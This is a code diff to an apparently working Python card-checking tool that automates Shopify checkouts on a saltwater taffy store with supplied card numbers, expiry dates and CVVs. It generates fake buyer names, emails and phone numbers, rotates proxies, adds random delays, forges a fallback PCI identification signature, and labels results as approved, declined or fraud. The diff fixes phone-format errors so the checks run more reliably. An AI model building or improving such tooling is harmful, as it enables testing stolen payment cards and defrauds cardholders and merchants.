@@ -467,6 +467,8 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             response_display = "PROCESSING_TIMEOUT"
         elif "ACTIONREQUIREDRECEIPT" in raw_response.upper():
             response_display = "3D_SECURE"
+        elif "PHONE_NUMBER" in raw_response.upper():
+            response_display = "ERR_PHONE_FORMAT"
         else:
             if ":" in raw_response:
                 response_display = raw_response.split(":")[0].strip()
@@ -534,6 +536,8 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             status_flag = "Fraud ⚠️"
         elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
             status_flag = "Proxy Error 🚫"
+        elif "PHONE_NUMBER" in raw_response_upper:
+            status_flag = "Error❗️"
         else:
             status_flag = "Declined ❌"
 
@@ -621,11 +625,9 @@ class ShopifyTaffyCheckout:
         self.queue_token = None
         self._r_param = None
         
-        # CRITICAL: PCI signature extracted from checkout page
         self.pci_signature = None
         self.pci_build_hash = "070d608"
         
-        # signedHandles for delivery expectations
         self.signed_handles = []
         
         self.delivery_strategy_handle = None
@@ -648,7 +650,8 @@ class ShopifyTaffyCheckout:
         self.last_name = random.choice(self.last_names)
         self.full_name = f"{self.first_name} {self.last_name}"
         self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
-        self.phone = f"515{random.randint(100, 999)}{random.randint(1000, 9999)}"
+        # FIXED: Valid US phone format +1XXXXXXXXXX
+        self.phone = f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
 
         self.address = {
             "address1": "211 5th Street",
@@ -707,10 +710,7 @@ class ShopifyTaffyCheckout:
     def generate_timestamp(self):
         return str(int(time.time() * 1000))
 
-    # ========== CRITICAL EXTRACTION FUNCTIONS ==========
-    
     def extract_pci_signature(self, html):
-        """Extract the REAL shopify-identification-signature from checkout page"""
         sig_patterns = [
             r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
             r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
@@ -727,7 +727,6 @@ class ShopifyTaffyCheckout:
         return None
 
     def extract_pci_build_hash(self, html):
-        """Extract PCI build hash from checkout page"""
         pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
         if pci_m:
             self.pci_build_hash = pci_m.group(1)
@@ -735,7 +734,6 @@ class ShopifyTaffyCheckout:
         return self.pci_build_hash
 
     def extract_signed_handles(self, html):
-        """Extract signedHandles for delivery expectations"""
         handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
         if not handles:
             raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
@@ -744,7 +742,6 @@ class ShopifyTaffyCheckout:
         return handles
 
     def extract_session_token(self, html):
-        """Extract session token from checkout page"""
         m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
         if m:
             self.session_token = m.group(1)
@@ -765,7 +762,6 @@ class ShopifyTaffyCheckout:
         return None
 
     def extract_stable_id(self, html):
-        """Extract stable ID from checkout page"""
         stable_patterns = [
             r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
             r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
@@ -779,7 +775,6 @@ class ShopifyTaffyCheckout:
         return self.stable_id
 
     def extract_queue_token(self, html):
-        """Extract queue token from checkout page"""
         m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
         if not m:
             m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
@@ -789,7 +784,6 @@ class ShopifyTaffyCheckout:
         return None
 
     def extract_payment_identifier(self, html):
-        """Extract payment method identifier from checkout page"""
         m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
         if not m:
             m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
@@ -799,7 +793,6 @@ class ShopifyTaffyCheckout:
         return None
 
     def extract_delivery_strategy(self, html):
-        """Extract delivery strategy handle from checkout page"""
         patterns = [
             r'"handle"\s*:\s*"([a-f0-9]{32}-[a-f0-9]{32})"',
             r'handle[\s:=]+["\'"]([a-f0-9]{32}-[a-f0-9]{32})',
@@ -812,7 +805,6 @@ class ShopifyTaffyCheckout:
         return None
 
     async def visit_homepage(self):
-        """Step 1: Visit homepage to get initial cookies"""
         self.step(1, "VISIT HOMEPAGE", "Getting initial cookies from homepage")
         
         try:
@@ -824,7 +816,6 @@ class ShopifyTaffyCheckout:
             
             if resp.status_code == 200:
                 self.logger.data_extracted("Cookies", "Homepage cookies received", "Homepage")
-                # Extract PCI build hash early
                 self.extract_pci_build_hash(resp.text)
                 return True, "HOMEPAGE_COOKIES"
             else:
@@ -840,7 +831,6 @@ class ShopifyTaffyCheckout:
             return False, f"Homepage error: {str(e)[:50]}"
 
     async def visit_product_page(self):
-        """Step 2: Visit product page"""
         self.step(2, "VISIT PRODUCT", "Visiting saltwater taffy product page")
         
         product_headers = {
@@ -868,7 +858,6 @@ class ShopifyTaffyCheckout:
             return False, f"Product page error: {str(e)[:50]}"
 
     async def add_to_cart(self):
-        """Step 3: Add product to cart via POST"""
         self.step(3, "ADD TO CART", "Adding 5x saltwater taffy to cart")
         
         cart_add_headers = {
@@ -937,7 +926,6 @@ class ShopifyTaffyCheckout:
             return False, f"Cart add error: {str(e)[:50]}"
 
     async def go_to_cart(self):
-        """Step 4: POST to /cart to get redirected to checkout"""
         self.step(4, "GO TO CART", "POST to cart for checkout redirect")
         
         cart_headers = {
@@ -992,7 +980,6 @@ class ShopifyTaffyCheckout:
             return False, f"Cart POST error: {str(e)[:50]}"
 
     async def get_checkout_page(self):
-        """Step 5: GET checkout page - EXTRACT ALL CRITICAL TOKENS"""
         self.step(5, "GET CHECKOUT PAGE", "Loading checkout page and extracting tokens")
         
         checkout_headers = {
@@ -1029,7 +1016,6 @@ class ShopifyTaffyCheckout:
             
             html = resp.text
             
-            # Extract ALL critical tokens
             self.extract_session_token(html)
             self.extract_stable_id(html)
             self.extract_queue_token(html)
@@ -1049,7 +1035,6 @@ class ShopifyTaffyCheckout:
             self.logger.data_extracted("Delivery Handle", (self.delivery_strategy_handle or "N/A")[:20] + "..." if self.delivery_strategy_handle else "N/A", "Checkout page")
             
             if not self.session_token:
-                # Fallback generation
                 self.session_token = f"AAEB_{self.generate_random_string(50)}"
                 self.logger.data_extracted("Session Token (fallback)", self.session_token[:20] + "...", "Generated")
             
@@ -1063,7 +1048,6 @@ class ShopifyTaffyCheckout:
             return False, f"Checkout page error: {str(e)[:50]}"
 
     async def create_payment_session(self, cc, mes, ano, cvv):
-        """Step 6: Create PCI payment session with EXTRACTED signature"""
         self.step(6, "CREATE PAYMENT", "Creating PCI payment session with real signature")
         
         pci_headers = {
@@ -1083,12 +1067,10 @@ class ShopifyTaffyCheckout:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
         }
         
-        # Use the REAL extracted signature if available
         if self.pci_signature:
             pci_headers['shopify-identification-signature'] = self.pci_signature
             self.logger.data_extracted("PCI Signature Used", "REAL extracted signature", "Checkout page")
         else:
-            # Fallback: generate fake signature (may cause GENERIC_ERROR)
             header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
             payload_data = {
                 "client_id": "2",
@@ -1099,7 +1081,7 @@ class ShopifyTaffyCheckout:
             payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
             signature = self.generate_random_string(43)
             pci_headers['shopify-identification-signature'] = f"{header}.{payload_b64}.{signature}"
-            self.logger.data_extracted("PCI Signature Used", "GENERATED fallback (may cause errors)", "Generated")
+            self.logger.data_extracted("PCI Signature Used", "GENERATED fallback", "Generated")
         
         card_number = cc.replace(" ", "").replace("-", "")
         year_full = ano if len(ano) == 4 else f"20{ano}"
@@ -1153,10 +1135,8 @@ class ShopifyTaffyCheckout:
             return False, "PCI_ERROR"
 
     async def submit_for_completion(self, payment_session_id, cc):
-        """Step 7: Submit for completion with ALL required fields"""
         self.step(7, "SUBMIT PAYMENT", "Finalizing payment with complete payload")
         
-        # Use unstable graphql endpoint (matches working script)
         graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
         
         graphql_headers = {
@@ -1187,12 +1167,12 @@ class ShopifyTaffyCheckout:
         card_clean = cc.replace(" ", "").replace("-", "")
         credit_card_bin = card_clean[:8] if len(card_clean) >= 8 else card_clean[:6]
         
-        # Build delivery expectation lines from signed handles
+        # Build delivery expectation lines from signed handles (empty if none)
         delivery_expectation_lines = []
         if self.signed_handles:
             delivery_expectation_lines = [{"signedHandle": sh} for sh in self.signed_handles]
         
-        # Build the complete payload
+        # FIXED: Don't send phone in SMS consent - use empty or skip SMS
         variables = {
             "input": {
                 "checkpointData": None,
@@ -1217,7 +1197,7 @@ class ShopifyTaffyCheckout:
                                 "firstName": self.first_name,
                                 "lastName": self.last_name,
                                 "zoneCode": self.address["provinceCode"],
-                                "phone": self.phone,
+                                "phone": "",
                                 "oneTimeUse": False
                             }
                         },
@@ -1226,7 +1206,7 @@ class ShopifyTaffyCheckout:
                                 "estimatedTimeInTransit": {"any": True},
                                 "shipments": {"any": True}
                             },
-                            "options": {"phone": self.phone}
+                            "options": {"phone": ""}
                         },
                         "targetMerchandiseLines": {
                             "lines": [{"stableId": self.stable_id}]
@@ -1280,7 +1260,7 @@ class ShopifyTaffyCheckout:
                                         "firstName": self.first_name,
                                         "lastName": self.last_name,
                                         "zoneCode": self.address["provinceCode"],
-                                        "phone": self.phone
+                                        "phone": ""
                                     }
                                 },
                                 "cardSource": None
@@ -1314,7 +1294,7 @@ class ShopifyTaffyCheckout:
                             "firstName": self.first_name,
                             "lastName": self.last_name,
                             "zoneCode": self.address["provinceCode"],
-                            "phone": self.phone
+                            "phone": ""
                         }
                     },
                     "creditCardBin": credit_card_bin
@@ -1328,13 +1308,9 @@ class ShopifyTaffyCheckout:
                     "emailChanged": False,
                     "phoneCountryCode": "US",
                     "marketingConsent": [
-                        {"sms": {"consentState": "DECLINED", "value": self.phone, "countryCode": "US"}},
                         {"email": {"consentState": "GRANTED", "value": self.email}}
                     ],
-                    "shopPayOptInPhone": {
-                        "number": self.phone,
-                        "countryCode": "US"
-                    },
+                    "shopPayOptInPhone": {"countryCode": "US"},
                     "rememberMe": False,
                     "setShippingAddressAsDefault": False
                 },
@@ -1354,7 +1330,7 @@ class ShopifyTaffyCheckout:
                 "shopPayArtifact": {
                     "optIn": {
                         "vaultEmail": "",
-                        "vaultPhone": self.phone,
+                        "vaultPhone": "",
                         "optInSource": "REMEMBER_ME"
                     }
                 },
@@ -1378,7 +1354,6 @@ class ShopifyTaffyCheckout:
             }
         }
         
-        # SubmitForCompletion mutation
         mutation = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'
         
         payload = {
@@ -1453,6 +1428,17 @@ class ShopifyTaffyCheckout:
                     else:
                         return False, f"Unknown receipt: {receipt_type}"
                 
+                elif typename == 'SubmitRejected':
+                    errors = submit.get('errors', [])
+                    error_msgs = []
+                    for e in errors:
+                        code = e.get('code', 'UNKNOWN')
+                        msg = e.get('localizedMessage', '')
+                        error_msgs.append(f"{code}: {msg}")
+                    if error_msgs:
+                        return False, f"DECLINED - {'; '.join(error_msgs[:3])}"
+                    return False, "DECLINED - Submit rejected"
+                
                 elif typename == 'SubmitFailed':
                     return False, f"DECLINED - {submit.get('reason', 'Submit failed')}"
                 
@@ -1466,17 +1452,6 @@ class ShopifyTaffyCheckout:
                 
                 elif typename == 'CheckpointDenied':
                     return False, "DECLINED - Checkpoint denied"
-                
-                elif typename == 'SubmitRejected':
-                    errors = submit.get('errors', [])
-                    error_msgs = []
-                    for e in errors:
-                        code = e.get('code', 'UNKNOWN')
-                        msg = e.get('localizedMessage', '')
-                        error_msgs.append(f"{code}: {msg}")
-                    if error_msgs:
-                        return False, f"DECLINED - {'; '.join(error_msgs[:3])}"
-                    return False, "DECLINED - Submit rejected"
                 
                 else:
                     if attempt_num < max_retries - 1:
@@ -1505,7 +1480,6 @@ class ShopifyTaffyCheckout:
         return False, "DECLINED - Max retries exceeded"
 
     async def poll_receipt(self, headers, max_polls=10):
-        """Step 8: Poll for receipt with proper query"""
         self.step(8, "POLL RECEIPT", "Polling for payment status")
         
         graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
@@ -1581,7 +1555,6 @@ class ShopifyTaffyCheckout:
         return False, "DECLINED - Polling timeout"
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Main checkout execution flow"""
         try:
             self.step(0, "GET PROXY", "Getting proxy")
             
@@ -1598,43 +1571,36 @@ class ShopifyTaffyCheckout:
                 self.proxy_status = "No Proxy"
                 self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
             
-            # Step 1: Visit homepage for cookies
             success, result = await self.visit_homepage()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 2: Visit product page
             success, result = await self.visit_product_page()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 3: Add to cart
             success, result = await self.add_to_cart()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 4: POST to cart for checkout redirect
             success, result = await self.go_to_cart()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 5: GET checkout page and extract ALL tokens
             success, result = await self.get_checkout_page()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 6: Create PCI payment session with real signature
             success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
             if not success:
                 return False, payment_session_id
             await self.random_delay(0.3, 0.5)
             
-            # Step 7: Submit for completion
             success, result = await self.submit_for_completion(payment_session_id, cc)
             
             return success, result
